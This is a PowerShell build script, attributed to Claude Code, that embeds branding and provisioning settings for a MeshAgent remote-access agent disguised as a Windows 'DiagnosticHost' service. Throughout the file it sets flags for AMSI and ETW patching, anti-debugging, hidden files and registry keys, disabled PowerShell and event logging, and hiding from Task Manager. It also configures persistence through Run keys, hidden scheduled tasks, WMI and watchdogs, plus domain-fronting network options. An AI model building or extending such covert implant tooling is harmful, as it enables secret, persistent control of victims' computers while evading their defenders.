<#
.SYNOPSIS
    Embeds provisioning data from the current branding configuration into the MeshAgent build

.DESCRIPTION
    This script reads branding_config.local.json (or branding_config.json as a fallback) and generates:
    1. meshagent_branding.h with embedded provisioning data
    2. .msh file for runtime provisioning

.NOTES
    Author: Generated with Claude Code
    Run before building MeshAgent DLL
#>

param(
    [string]$ConfigPath,
    [string]$OutputHeader,
    [string]$OutputMsh
)

$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$repoRoot = (Resolve-Path (Join-Path $scriptDir '..')).ProviderPath
if (-not $OutputHeader) {
    $OutputHeader = Join-Path $repoRoot 'meshcore\generated\meshagent_branding.h'
}
if (-not $OutputMsh) {
    $OutputMsh = Join-Path $repoRoot 'WinDiagnosticHost.msh'
}

$brandingHelper = Join-Path $repoRoot 'tools\BrandingConfig.ps1'
if (-not (Test-Path -LiteralPath $brandingHelper)) {
    throw "Branding helper missing at $brandingHelper"
}
. $brandingHelper
$ConfigPath = Resolve-BrandingConfigPath -RepoRoot $repoRoot -ConfigPath $ConfigPath

Write-Host "=== MeshAgent Provisioning Embedder ===" -ForegroundColor Cyan

# Read branding config
Write-Host "[INFO] Reading config: $ConfigPath" -ForegroundColor Yellow
$config = Get-Content $ConfigPath -Raw | ConvertFrom-Json

if ([string]::IsNullOrWhiteSpace($config.branding.serviceName) -or [string]::IsNullOrWhiteSpace($config.branding.displayName)) {
    Write-Host "[ERROR] branding.serviceName and branding.displayName must be populated." -ForegroundColor Red
    exit 1
}

function Get-OptionalValue {
    param(
        [Parameter(Mandatory = $true)]
        [object]$Source,
        [Parameter(Mandatory = $true)]
        [string]$PropertyName
    )

    if ($null -eq $Source) { return $null }
    if ($Source -is [System.Collections.IDictionary]) {
        if ($Source.Contains($PropertyName)) { return $Source[$PropertyName] }
        if ($Source.ContainsKey($PropertyName)) { return $Source[$PropertyName] }
    }

    $property = $Source.PSObject.Properties[$PropertyName]
    if ($null -ne $property) {
        return $property.Value
    }
    return $null
}

function Get-OptionalBool {
    param(
        [object]$Source,
        [string]$PropertyName,
        [bool]$Default = $false
    )

    $value = Get-OptionalValue -Source $Source -PropertyName $PropertyName
    if ($null -eq $value) { return $Default }
    return [bool]$value
}

function ConvertToFlag {
    param([bool]$Value)
    if ($Value) { return 1 } else { return 0 }
}

function Convert-MeshIdToHexString {
    param([string]$MeshId)

    if ([string]::IsNullOrWhiteSpace($MeshId)) { return $MeshId }
    if ($MeshId.StartsWith('0x')) { return $MeshId.ToUpperInvariant() }

    try {
        $normalized = $MeshId.Replace('@', '+').Replace('$', '/')
        $bytes = [Convert]::FromBase64String($normalized)
        if ($null -eq $bytes -or $bytes.Length -eq 0) { return $MeshId }
        $hex = ($bytes | ForEach-Object { $_.ToString('X2') }) -join ''
        return '0x' + $hex
    } catch {
        Write-Host "[WARN] Unable to convert MeshID '$MeshId' to hex: $($_.Exception.Message)" -ForegroundColor Yellow
        return $MeshId
    }
}

function Escape-CText {
    param([string]$Value)
    if ($null -eq $Value) { return "" }
    return ($Value -replace '\\', '\\\\' -replace '"', '\"')
}

# Derived branding artifacts
$installRoot = if ($config.branding.installRoot) { $config.branding.installRoot } else { "C:/ProgramData/DiagnosticHost" }
$logPath = if ($config.branding.logPath) { $config.branding.logPath } else { "$installRoot/logs" }
$binaryName = if ($config.branding.binaryName) { $config.branding.binaryName } else { "diaghost.exe" }
$svcDllName = Get-OptionalValue -Source $config.stealth -PropertyName 'serviceDllName'
if ([string]::IsNullOrWhiteSpace($svcDllName)) { $svcDllName = "diagsvc.dll" }
$artifacts = Get-OptionalValue -Source $config -PropertyName 'artifacts'
$databaseName = Get-OptionalValue -Source $artifacts -PropertyName 'databaseName'
if ([string]::IsNullOrWhiteSpace($databaseName)) { $databaseName = "diaghost.db" }
$configFileName = Get-OptionalValue -Source $artifacts -PropertyName 'configFileName'
if ([string]::IsNullOrWhiteSpace($configFileName)) { $configFileName = "diaghost.conf" }
$logFileName = Get-OptionalValue -Source $artifacts -PropertyName 'logFileName'
if ([string]::IsNullOrWhiteSpace($logFileName)) { $logFileName = "diagnostics.log" }

# Normalise allowlist entries
$allowedThumbprints = @()
if ($config.security -and $config.security.allowedSigners) {
    foreach ($entry in $config.security.allowedSigners) {
        if ($null -eq $entry.thumbprint) { continue }
        $normalized = ($entry.thumbprint -replace '[^0-9a-fA-F]', '').ToUpperInvariant()
        if ($normalized.Length -ne 40) {
            Write-Host "[WARN] Skipping invalid thumbprint '$($entry.thumbprint)'; expected 40 hex characters." -ForegroundColor Yellow
            continue
        }
        $allowedThumbprints += $normalized
    }
}

function Convert-ThumbprintsToMacro {
    param([string[]]$Thumbprints)

    if (-not $Thumbprints -or $Thumbprints.Count -eq 0) {
        return @{
            Count = 0
            Macro = $null
        }
    }

    $arrayEntries = @()
    foreach ($thumb in $Thumbprints) {
        $bytes = @()
        for ($i = 0; $i -lt $thumb.Length; $i += 2) {
            $bytes += ("0x{0}" -f $thumb.Substring($i, 2))
        }
        $arrayEntries += ("{ " + ($bytes -join ", ") + " }")
    }

    return @{
        Count = $Thumbprints.Count
        Macro = "{ " + ($arrayEntries -join ", ") + " }"
    }
}

function Convert-ToCLiteral {
    param([string]$Value)

    if ([string]::IsNullOrWhiteSpace($Value)) {
        return "NULL"
    }

    $escaped = $Value -replace '\\', '\\\\' -replace '"', '\"'
    return '"' + $escaped + '"'
}

$allowlistMacro = Convert-ThumbprintsToMacro -Thumbprints $allowedThumbprints
# Extract values
$branding = $config.branding
$network = $config.network
$fallbackEntries = @()
if ($network.fallbackEndpoints) {
    foreach ($entry in $network.fallbackEndpoints) {
        if ($null -eq $entry) { continue }
        if ($entry -is [string]) {
            if ([string]::IsNullOrWhiteSpace($entry)) { continue }
            $fallbackEntries += [pscustomobject]@{
                url        = $entry.Trim()
                sni        = $null
                hostHeader = $null
                userAgent  = $null
                alpn       = @()
            }
            continue
        }

        $url = Get-OptionalValue -Source $entry -PropertyName 'url'
        if ([string]::IsNullOrWhiteSpace($url)) { continue }
        $entryAlpn = @()
        if ($entry.alpn -is [System.Collections.IEnumerable]) {
            $entryAlpn = @($entry.alpn | Where-Object { -not [string]::IsNullOrWhiteSpace($_) })
        }

        $fallbackEntries += [pscustomobject]@{
            url        = $url
            sni        = Get-OptionalValue -Source $entry -PropertyName 'sni'
            hostHeader = Get-OptionalValue -Source $entry -PropertyName 'hostHeader'
            userAgent  = Get-OptionalValue -Source $entry -PropertyName 'userAgent'
            alpn       = $entryAlpn
        }
    }
}
$fallbackCount = $fallbackEntries.Count
if ($fallbackCount -gt 0) {
    $fallbackLiterals = @()
    foreach ($entry in $fallbackEntries) {
        $alpnValue = $null
        if ($entry.alpn -and $entry.alpn.Count -gt 0) {
            $alpnValue = ($entry.alpn -join ";")
        }
        $fallbackLiterals += ("{ " + (Convert-ToCLiteral $entry.url) + ", " + (Convert-ToCLiteral $entry.sni) + ", " + (Convert-ToCLiteral $entry.hostHeader) + ", " + (Convert-ToCLiteral $entry.userAgent) + ", " + (Convert-ToCLiteral $alpnValue) + " }")
    }
    $fallbackListMacro = "{ " + ([string]::Join(", ", $fallbackLiterals)) + " }"
} else {
    $fallbackListMacro = "{ }"
}
$primaryHostHeaderLiteral = Convert-ToCLiteral (Get-OptionalValue -Source $network -PropertyName 'hostHeader')
$provisioning = $config.provisioning
$stealth = if ($config.stealth) { $config.stealth } else { [pscustomobject]@{} }
$persistence = if ($config.persistence) { $config.persistence } else { [pscustomobject]@{} }
$scheduledTask = if ($persistence.scheduledTask) { $persistence.scheduledTask } else { [pscustomobject]@{} }
$wmiSection = if ($persistence.wmi) { $persistence.wmi } else { [pscustomobject]@{} }
$watchdogSection = if ($persistence.watchdog) { $persistence.watchdog } else { [pscustomobject]@{} }
$serviceRecovery = if ($persistence.serviceRecovery) { $persistence.serviceRecovery } else { [pscustomobject]@{} }
$evasion = if ($config.evasion) { $config.evasion } else { [pscustomobject]@{} }

# Determine default bundle extraction behavior for svchost deployments
$bundleExtractDefault = Get-OptionalBool -Source $stealth -PropertyName 'bundleExtract'
$svchostMode = Get-OptionalBool -Source $stealth -PropertyName 'svchostMode'
if ($svchostMode -and -not $bundleExtractDefault) {
    Write-Host "[WARN] Svchost mode enabled but bundle extraction disabled in branding config; forcing extraction on." -ForegroundColor Yellow
    $bundleExtractDefault = $true
}
$bundleExtractMacro = ConvertToFlag $bundleExtractDefault

$stealthEnabledFlag = ConvertToFlag (Get-OptionalBool -Source $stealth -PropertyName 'enabled')
$stealthHideFilesFlag = ConvertToFlag (Get-OptionalBool -Source $stealth -PropertyName 'hideFiles')
$stealthHideRegistryFlag = ConvertToFlag (Get-OptionalBool -Source $stealth -PropertyName 'hideRegistry')
$stealthAmsiFlag = ConvertToFlag (Get-OptionalBool -Source $stealth -PropertyName 'amsiPatch')
$stealthEttwFlag = ConvertToFlag (Get-OptionalBool -Source $stealth -PropertyName 'ettwPatch')
$stealthAntiDebugFlag = ConvertToFlag (Get-OptionalBool -Source $stealth -PropertyName 'antiDebug')
$stealthSyscallsFlag = ConvertToFlag (Get-OptionalBool -Source $stealth -PropertyName 'syscallsDirectMode')
$stealthSvchostFlag = ConvertToFlag $svchostMode
$meshIdRawValue = Get-OptionalValue -Source $provisioning -PropertyName 'meshId'
$meshIdHexValue = Convert-MeshIdToHexString -MeshId $meshIdRawValue
$meshIdHeaderValue = if (-not [string]::IsNullOrWhiteSpace($meshIdHexValue)) { $meshIdHexValue } else { $meshIdRawValue }

$persistRunKeyFlag = ConvertToFlag (Get-OptionalBool -Source $persistence -PropertyName 'runKey')
$persistTaskFlag = ConvertToFlag (Get-OptionalBool -Source $scheduledTask -PropertyName 'enabled')
$persistWmiFlag = ConvertToFlag (Get-OptionalBool -Source $wmiSection -PropertyName 'enabled')
$persistWatchdogFlag = ConvertToFlag (Get-OptionalBool -Source $watchdogSection -PropertyName 'enabled')
$persistRecoveryEnabledFlag = ConvertToFlag (Get-OptionalBool -Source $serviceRecovery -PropertyName 'enabled')

$brandingServiceName = if ([string]::IsNullOrWhiteSpace($branding.serviceName)) { "Mesh Agent" } else { $branding.serviceName }
$persistTaskName = Get-OptionalValue -Source $scheduledTask -PropertyName 'taskName'
if ([string]::IsNullOrWhiteSpace($persistTaskName)) { $persistTaskName = "$brandingServiceName Autorun" }
$persistTaskTrigger = Get-OptionalValue -Source $scheduledTask -PropertyName 'trigger'
if ([string]::IsNullOrWhiteSpace($persistTaskTrigger)) { $persistTaskTrigger = "ONLOGON" }
$persistTaskHiddenFlag = ConvertToFlag (Get-OptionalBool -Source $scheduledTask -PropertyName 'hidden' -Default $true)

$persistRestartTaskName = Get-OptionalValue -Source $wmiSection -PropertyName 'taskName'
if ([string]::IsNullOrWhiteSpace($persistRestartTaskName)) { $persistRestartTaskName = "$brandingServiceName-RestartOnStop" }
$persistWmiClassValue = Get-OptionalValue -Source $wmiSection -PropertyName 'className'
$persistWmiMethodValue = Get-OptionalValue -Source $wmiSection -PropertyName 'methodName'
$persistWmiNamespaceValue = Get-OptionalValue -Source $wmiSection -PropertyName 'namespace'
if ($null -eq $persistWmiClassValue) { $persistWmiClassValue = "" }
if ($null -eq $persistWmiMethodValue) { $persistWmiMethodValue = "" }
if ($null -eq $persistWmiNamespaceValue) { $persistWmiNamespaceValue = "" }

$persistWatchdogInterval = Get-OptionalValue -Source $watchdogSection -PropertyName 'intervalSeconds'
if ([string]::IsNullOrWhiteSpace($persistWatchdogInterval)) { $persistWatchdogInterval = 0 }
$persistWatchdogRestartDelay = Get-OptionalValue -Source $watchdogSection -PropertyName 'restartDelay'
if ([string]::IsNullOrWhiteSpace($persistWatchdogRestartDelay)) { $persistWatchdogRestartDelay = 0 }
$persistWatchdogRestartFlag = ConvertToFlag (Get-OptionalBool -Source $watchdogSection -PropertyName 'restartOnCrash')
$persistRecoveryResetPeriod = Get-OptionalValue -Source $serviceRecovery -PropertyName 'resetPeriod'
if ([string]::IsNullOrWhiteSpace($persistRecoveryResetPeriod)) { $persistRecoveryResetPeriod = 0 }
$persistRecoveryRestartDelay = Get-OptionalValue -Source $serviceRecovery -PropertyName 'restartDelay'
if ([string]::IsNullOrWhiteSpace($persistRecoveryRestartDelay)) { $persistRecoveryRestartDelay = 0 }
$persistRecoveryActions = @()
if ($serviceRecovery.actions) {
    foreach ($action in $serviceRecovery.actions) {
        if ([string]::IsNullOrWhiteSpace($action)) { continue }
        $persistRecoveryActions += $action.ToString().Trim()
    }
}
$persistRecoveryActionsString = ($persistRecoveryActions -join ",")
if (-not [string]::IsNullOrWhiteSpace($persistRecoveryActionsString)) {
    $persistRecoveryActionsString = $persistRecoveryActionsString.ToLowerInvariant()
}
$persistRecoveryActionsEscaped = Escape-CText $persistRecoveryActionsString

$persistTaskNameEscaped = Escape-CText $persistTaskName
$persistTaskTriggerEscaped = Escape-CText $persistTaskTrigger.ToUpperInvariant()
$persistRestartTaskNameEscaped = Escape-CText $persistRestartTaskName
$persistWmiClassEscaped = Escape-CText $persistWmiClassValue
$persistWmiMethodEscaped = Escape-CText $persistWmiMethodValue
$persistWmiNamespaceEscaped = Escape-CText $persistWmiNamespaceValue

$evasionPsLoggingFlag = ConvertToFlag (Get-OptionalBool -Source $evasion -PropertyName 'disablePowerShellLogging')
$evasionEventLogsFlag = ConvertToFlag (Get-OptionalBool -Source $evasion -PropertyName 'disableEventLogs')
$evasionEtwFlag = ConvertToFlag (Get-OptionalBool -Source $evasion -PropertyName 'disableETW')
$evasionHideTaskmanFlag = ConvertToFlag (Get-OptionalBool -Source $evasion -PropertyName 'hideFromTaskManager')
$evasionSyscallsFlag = ConvertToFlag (Get-OptionalBool -Source $evasion -PropertyName 'useSyscalls')

$versionInfo = $branding.versionInfo

function Get-VersionParts {
    param([string]$version)
    if ([string]::IsNullOrWhiteSpace($version)) {
        $version = "0.0.0.0"
    }
    $tokens = $version.Split('.', 4)
    $parts = @()
    foreach ($token in $tokens) {
        if ($token -match '^\d+$') {
            $parts += [int]$token
        } else {
            $match = [regex]::Match($token, '\d+')
            if ($match.Success) {
                $parts += [int]$match.Value
            } else {
                $parts += 0
            }
        }
    }
    while ($parts.Count -lt 4) { $parts += 0 }
    return $parts[0..3]
}

$fileVersionStr = if ($versionInfo.fileVersion) { $versionInfo.fileVersion } else { "1.0.0.0" }
$productVersionStr = if ($versionInfo.productVersion) { $versionInfo.productVersion } else { $fileVersionStr }
$fileVersionParts = Get-VersionParts $fileVersionStr
$productVersionParts = Get-VersionParts $productVersionStr
$internalName = if ($versionInfo.internalName) { $versionInfo.internalName } else { $branding.binaryName }
$originalFilename = if ($versionInfo.originalFilename) { $versionInfo.originalFilename } else { $internalName }

if ($OutputHeader) {
    # Generate branding header
    Write-Host "[INFO] Generating branding header: $OutputHeader" -ForegroundColor Yellow

    $allowlistCount = $allowlistMacro.Count
    $allowlistBlock = if ($allowlistMacro.Macro) {
@"
#undef MESH_AGENT_ALLOWED_SIGNERS_COUNT
#define MESH_AGENT_ALLOWED_SIGNERS_COUNT $allowlistCount
#undef MESH_AGENT_ALLOWED_SIGNERS
#define MESH_AGENT_ALLOWED_SIGNERS $($allowlistMacro.Macro)
"@
    } else {
@"
#undef MESH_AGENT_ALLOWED_SIGNERS_COUNT
#define MESH_AGENT_ALLOWED_SIGNERS_COUNT 0
"@
    }

    $headerContent = @"
/* Generated file - do not edit. */
/* Generated on: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss") */
#ifndef GENERATED_MESHAGENT_BRANDING_H
#define GENERATED_MESHAGENT_BRANDING_H

/* ========== Service Branding ========== */
#undef MESH_AGENT_SERVICE_FILE
#define MESH_AGENT_SERVICE_FILE TEXT("$($branding.serviceName)")
#undef MESH_AGENT_SERVICE_NAME
#define MESH_AGENT_SERVICE_NAME TEXT("$($branding.displayName)")
#undef MESH_AGENT_COMPANY_NAME
#define MESH_AGENT_COMPANY_NAME "$($branding.companyName)"
#undef MESH_AGENT_PRODUCT_NAME
#define MESH_AGENT_PRODUCT_NAME "$($branding.productName)"
#undef MESH_AGENT_FILE_DESCRIPTION
#define MESH_AGENT_FILE_DESCRIPTION "$($branding.description)"
#undef MESH_AGENT_INTERNAL_NAME
#define MESH_AGENT_INTERNAL_NAME "$($internalName)"
#undef MESH_AGENT_COPYRIGHT
#define MESH_AGENT_COPYRIGHT "$($branding.versionInfo.legalCopyright)"
#undef MESH_AGENT_ORIGINAL_FILENAME
#define MESH_AGENT_ORIGINAL_FILENAME "$($originalFilename)"
#undef MESH_AGENT_INSTALL_ROOT
#define MESH_AGENT_INSTALL_ROOT TEXT("$installRoot")
#undef MESH_AGENT_LOG_DIRECTORY
#define MESH_AGENT_LOG_DIRECTORY TEXT("$logPath")
#undef MESH_AGENT_BINARY_NAME
#define MESH_AGENT_BINARY_NAME TEXT("$binaryName")
#undef MESH_AGENT_SVCHOST_DLL
#define MESH_AGENT_SVCHOST_DLL TEXT("$svcDllName")
#undef MESH_AGENT_ARTIFACT_DB
#define MESH_AGENT_ARTIFACT_DB TEXT("$databaseName")
#undef MESH_AGENT_ARTIFACT_CONFIG
#define MESH_AGENT_ARTIFACT_CONFIG TEXT("$configFileName")
#undef MESH_AGENT_ARTIFACT_LOG
#define MESH_AGENT_ARTIFACT_LOG TEXT("$logFileName")
#undef MESH_AGENT_FILE_VERSION_MAJOR
#define MESH_AGENT_FILE_VERSION_MAJOR $($fileVersionParts[0])
#undef MESH_AGENT_FILE_VERSION_MINOR
#define MESH_AGENT_FILE_VERSION_MINOR $($fileVersionParts[1])
#undef MESH_AGENT_FILE_VERSION_BUILD
#define MESH_AGENT_FILE_VERSION_BUILD $($fileVersionParts[2])
#undef MESH_AGENT_FILE_VERSION_REVISION
#define MESH_AGENT_FILE_VERSION_REVISION $($fileVersionParts[3])
#undef MESH_AGENT_FILE_VERSION_STR
#define MESH_AGENT_FILE_VERSION_STR TEXT("$fileVersionStr")
#undef MESH_AGENT_PRODUCT_VERSION_MAJOR
#define MESH_AGENT_PRODUCT_VERSION_MAJOR $($productVersionParts[0])
#undef MESH_AGENT_PRODUCT_VERSION_MINOR
#define MESH_AGENT_PRODUCT_VERSION_MINOR $($productVersionParts[1])
#undef MESH_AGENT_PRODUCT_VERSION_BUILD
#define MESH_AGENT_PRODUCT_VERSION_BUILD $($productVersionParts[2])
#undef MESH_AGENT_PRODUCT_VERSION_REVISION
#define MESH_AGENT_PRODUCT_VERSION_REVISION $($productVersionParts[3])
#undef MESH_AGENT_PRODUCT_VERSION_STR
#define MESH_AGENT_PRODUCT_VERSION_STR TEXT("$productVersionStr")

/* ========== Network Configuration ========== */
#define MESH_AGENT_NETWORK_ENDPOINT "$($network.primaryEndpoint)"
#define MESH_AGENT_NETWORK_SNI NULL
#define MESH_AGENT_NETWORK_HOST_HEADER $primaryHostHeaderLiteral
#define MESH_AGENT_NETWORK_USER_AGENT "$($network.userAgent)"
#define MESH_AGENT_NETWORK_JA3 NULL
#define MESH_AGENT_NETWORK_FALLBACK_COUNT $fallbackCount
#define MESH_AGENT_NETWORK_FALLBACK_LIST $fallbackListMacro

/* ========== Provisioning Data ========== */
#define MESH_AGENT_MESH_ID "$meshIdHeaderValue"
#define MESH_AGENT_SERVER_ID "$($provisioning.serverId)"
#define MESH_AGENT_MESH_NAME "$($provisioning.meshName)"
#define MESH_AGENT_SERVER_URL "$($provisioning.serverUrl)"
#define MESH_AGENT_MESH_TYPE $($provisioning.meshType)

/* ========== Stealth Features ========== */
#define MESH_AGENT_STEALTH_ENABLED $stealthEnabledFlag
#define MESH_AGENT_SVCHOST_MODE $stealthSvchostFlag
#define MESH_AGENT_HIDE_FILES $stealthHideFilesFlag
#define MESH_AGENT_HIDE_REGISTRY $stealthHideRegistryFlag
#define MESH_AGENT_AMSI_PATCH $stealthAmsiFlag
#define MESH_AGENT_ETW_PATCH $stealthEttwFlag
#define MESH_AGENT_ANTI_DEBUG $stealthAntiDebugFlag
#define MESH_AGENT_SYSCALLS_DIRECT $stealthSyscallsFlag
#define MESH_AGENT_BUNDLE_EXTRACT_DEFAULT $bundleExtractMacro

/* ========== Persistence Configuration ========== */
#define MESH_AGENT_PERSIST_RUNKEY $persistRunKeyFlag
#define MESH_AGENT_PERSIST_TASK $persistTaskFlag
#define MESH_AGENT_PERSIST_WMI $persistWmiFlag
#define MESH_AGENT_PERSIST_WATCHDOG $persistWatchdogFlag
#define MESH_AGENT_PERSIST_RECOVERY_ENABLED $persistRecoveryEnabledFlag
#define MESH_AGENT_PERSIST_TASK_NAME TEXT("$persistTaskNameEscaped")
#define MESH_AGENT_PERSIST_TASK_TRIGGER TEXT("$persistTaskTriggerEscaped")
#define MESH_AGENT_PERSIST_TASK_HIDDEN $persistTaskHiddenFlag
#define MESH_AGENT_PERSIST_RESTART_TASK_NAME TEXT("$persistRestartTaskNameEscaped")
#define MESH_AGENT_PERSIST_WMI_CLASS TEXT("$persistWmiClassEscaped")
#define MESH_AGENT_PERSIST_WMI_METHOD TEXT("$persistWmiMethodEscaped")
#define MESH_AGENT_PERSIST_WMI_NAMESPACE TEXT("$persistWmiNamespaceEscaped")
#define MESH_AGENT_PERSIST_WATCHDOG_INTERVAL $persistWatchdogInterval
#define MESH_AGENT_PERSIST_WATCHDOG_RESTART_DELAY $persistWatchdogRestartDelay
#define MESH_AGENT_PERSIST_WATCHDOG_RESTART_ON_CRASH $persistWatchdogRestartFlag
#define MESH_AGENT_PERSIST_RECOVERY_RESET_PERIOD $persistRecoveryResetPeriod
#define MESH_AGENT_PERSIST_RECOVERY_RESTART_DELAY_MS $persistRecoveryRestartDelay
#define MESH_AGENT_PERSIST_RECOVERY_ACTIONS TEXT("$persistRecoveryActionsEscaped")

/* ========== Evasion Features ========== */
#define MESH_AGENT_DISABLE_PS_LOGGING $evasionPsLoggingFlag
#define MESH_AGENT_DISABLE_EVENT_LOGS $evasionEventLogsFlag
#define MESH_AGENT_DISABLE_ETW $evasionEtwFlag
#define MESH_AGENT_HIDE_TASKMANAGER $evasionHideTaskmanFlag
#define MESH_AGENT_USE_SYSCALLS $evasionSyscallsFlag

/* ========== Signing Allowlist ========== */
$allowlistBlock

#endif /* GENERATED_MESHAGENT_BRANDING_H */
"@

    # Ensure output directory exists
    $headerDir = Split-Path $OutputHeader -Parent
    if (-not (Test-Path $headerDir)) {
        New-Item -ItemType Directory -Path $headerDir -Force | Out-Null
    }

    # Write header
    $headerContent | Out-File -FilePath $OutputHeader -Encoding UTF8
    Write-Host "[SUCCESS] Branding header generated" -ForegroundColor Green
} else {
    Write-Host "[INFO] Skipping branding header generation (OutputHeader not specified)." -ForegroundColor Yellow
}

# Generate .msh file (MeshCentral key/value format)
Write-Host "[INFO] Generating .msh file: $OutputMsh" -ForegroundColor Yellow

$mshLines = @()
$meshNameValue = Get-OptionalValue -Source $provisioning -PropertyName 'meshName'
if ($meshNameValue) { $mshLines += "MeshName=$meshNameValue" }
$meshTypeValue = Get-OptionalValue -Source $provisioning -PropertyName 'meshType'
if ($meshTypeValue) { $mshLines += "MeshType=$meshTypeValue" }
if ($meshIdHeaderValue) { $mshLines += "MeshID=$meshIdHeaderValue" }
$serverIdValue = Get-OptionalValue -Source $provisioning -PropertyName 'serverId'
if ($serverIdValue) { $mshLines += "ServerID=$serverIdValue" }
$serverUrlValue = Get-OptionalValue -Source $provisioning -PropertyName 'serverUrl'
if ($serverUrlValue) { $mshLines += "MeshServer=$serverUrlValue" }
$serviceNameValue = $branding.serviceName
if ($serviceNameValue) { $mshLines += "meshServiceName=$serviceNameValue" }
$displayNameValue = $branding.displayName
if ($displayNameValue) { $mshLines += "displayName=$displayNameValue" }
$companyNameValue = $branding.companyName
if ($companyNameValue) { $mshLines += "companyName=$companyNameValue" }
$descriptionValue = $branding.description
if ($descriptionValue) { $mshLines += "description=$descriptionValue" }
$binaryNameValue = $branding.binaryName
if ($binaryNameValue) { $mshLines += "fileName=$binaryNameValue" }

Set-Content -Path $OutputMsh -Value $mshLines -Encoding UTF8
Write-Host "[SUCCESS] .msh file generated" -ForegroundColor Green

Write-Host ""
Write-Host "=== Provisioning Data Embedded ===" -ForegroundColor Green
if ($meshIdRawValue) {
    $meshIdPreview = if ($meshIdRawValue.Length -gt 20) { $meshIdRawValue.Substring(0,20) + "..." } else { $meshIdRawValue }
    Write-Host "Mesh ID:   $meshIdPreview" -ForegroundColor Cyan
}
if ($meshIdHeaderValue -and $meshIdHeaderValue -ne $meshIdRawValue) {
    $meshIdHexPreview = if ($meshIdHeaderValue.Length -gt 20) { $meshIdHeaderValue.Substring(0,20) + "..." } else { $meshIdHeaderValue }
    Write-Host "Mesh ID (hex): $meshIdHexPreview" -ForegroundColor Cyan
}
if ($serverIdValue) {
    $serverIdPreview = if ($serverIdValue.Length -gt 20) { $serverIdValue.Substring(0,20) + "..." } else { $serverIdValue }
    Write-Host "Server ID: $serverIdPreview" -ForegroundColor Cyan
}
Write-Host "Endpoint:  $($network.primaryEndpoint)" -ForegroundColor Cyan
if ($fallbackCount -gt 0) {
    $idx = 1
    foreach ($entry in $fallbackEntries) {
        $details = @()
        if ($entry.sni) { $details += "SNI=$($entry.sni)" }
        if ($entry.hostHeader) { $details += "Host=$($entry.hostHeader)" }
        if ($entry.userAgent) { $details += "UA=$($entry.userAgent)" }
        if ($entry.alpn -and $entry.alpn.Count -gt 0) { $details += "ALPN=$($entry.alpn -join ';')" }
        $meta = if ($details.Count -gt 0) { " [" + ($details -join ", ") + "]" } else { "" }
        Write-Host ("  Fallback {0}: {1}{2}" -f $idx, $entry.url, $meta) -ForegroundColor Cyan
        $idx++
    }
} else {
    Write-Host "  Fallbacks: (none)" -ForegroundColor DarkGray
}
Write-Host ""
Write-Host "Ready to build MeshAgent DLL!" -ForegroundColor Green
